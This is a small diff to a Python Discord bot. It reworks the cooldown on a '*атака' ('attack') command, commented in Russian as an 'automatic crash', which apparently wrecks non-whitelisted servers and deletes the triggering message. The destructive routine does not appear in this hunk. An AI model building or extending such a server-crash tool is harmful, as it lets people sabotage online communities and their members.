@@ -130,8 +130,8 @@ class MyClient(discord.Client):
 					f.write(text)
 					f.truncate()
 				await message.author.send(':white_check_mark:')
-		if white.find(str(message.guild.id)) == -1 and black.find(str(message.author.id)) == -1 and cooldown != 1:
-			if message.content == '*атака': #автоматический краш
+		if white.find(str(message.guild.id)) == -1 and black.find(str(message.author.id)) == -1:
+			if message.content == '*атака' and cooldown != 1: #автоматический краш
 				cooldown = 1
 				await message.delete() #удаление сообщения
 				await message.author.send('Команда будет доступна через 1 минуту [для всех]')
